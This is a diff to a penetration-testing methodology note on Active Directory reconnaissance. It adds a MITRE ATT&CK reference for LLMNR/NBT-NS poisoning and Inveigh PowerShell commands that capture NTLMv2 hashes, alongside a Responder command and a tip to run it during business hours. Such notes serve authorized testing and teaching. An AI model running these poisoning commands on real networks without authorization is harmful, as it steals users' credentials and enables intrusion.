@@ -3,6 +3,7 @@
 - Passive measures (traffic capture, poisoning) collect data without generating noisy scans. Active measures (ping sweeps, nmap, kerbrute) validate and expand on those results.
 - Key targets are domain controllers, file servers, SQL servers, web servers, and Exchange servers. Key services to identify are Kerberos, NetBIOS, LDAP, and DNS.
 - Valid usernames collected here feed directly into password spraying in the next phase.
+- Mitre ATT&CK lists this technique as [ID: T1557.001](https://attack.mitre.org/techniques/T1557/001), `Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay`.
 ---
 ## Key Data Points
 
@@ -29,7 +30,16 @@ Capture raw traffic on the interface to identify live hosts and network topology
 sudo responder -I <interface>
 ```
 
-Poison LLMNR, NBT-NS, and MDNS queries on the interface to capture NTLMv2 hashes from hosts attempting name resolution. Run during business hours to maximize capture volume. 
+Poison LLMNR, NBT-NS, and MDNS queries on the interface to capture NTLMv2 hashes from hosts attempting name resolution. Run during business hours to maximize capture volume.
+
+```
+Import-Module .\Inveigh.ps1
+```
+```
+ Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+```
+
+We can quickly view unique captured hashes by typing `GET NTLMV2UNIQUE`.
 
 ---
 ## Host Discovery
